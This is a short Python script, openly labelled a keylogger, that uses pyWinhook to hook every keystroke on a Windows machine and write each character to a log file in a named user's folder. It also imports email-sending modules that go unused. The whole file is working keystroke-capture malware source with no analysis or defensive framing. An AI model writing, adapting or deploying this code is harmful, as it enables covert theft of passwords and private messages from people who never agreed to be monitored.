import pyWinhook, pythoncom, sys, logging,time,wmi,csv,smtplib
from email.mime.text import MIMEText
from datetime import date

#path to text file which keylogger will write to
file_log= 'C:\\Users\\Aryak Deshpande\\log.txt'

def onKeyboardEvent(event):
	logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True

hm=pyWinhook.HookManager()
hm.KeyDown=onKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

